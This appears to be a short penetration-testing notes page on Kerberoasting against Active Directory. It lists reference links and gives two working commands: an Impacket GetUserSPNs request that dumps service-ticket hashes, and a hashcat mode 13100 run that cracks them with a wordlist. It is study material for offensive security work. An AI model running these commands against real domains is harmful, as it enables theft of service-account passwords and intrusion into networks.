# Kerberoasting Overview

## Resources

* [https://medium.com/@Shorty420/kerberoasting-9108477279cc](https://medium.com/@Shorty420/kerberoasting-9108477279cc)
* [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)
* [https://www.youtube.com/watch?v=LmbP-XD1SC8&t=30s&ab\_channel=SANSOffensiveOperations](https://www.youtube.com/watch?v=LmbP-XD1SC8&t=30s&ab_channel=SANSOffensiveOperations)
* [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

![](../../../.gitbook/assets/kerberoasting-overview.png)

## Kerberoasting Attack Overview

### Step 1: Get SPNs \(Service Principal Name\), Dump Hash

```bash
python getuserspns.py <DOMAIN/username:password> -dc-ip <ip of DC> -request
```

### Step 2: Crack the Hash

```bash
hashcat --help | grep Kerberos
hashcat -m 13100 kerberoasthash.txt rockyou.txt
```

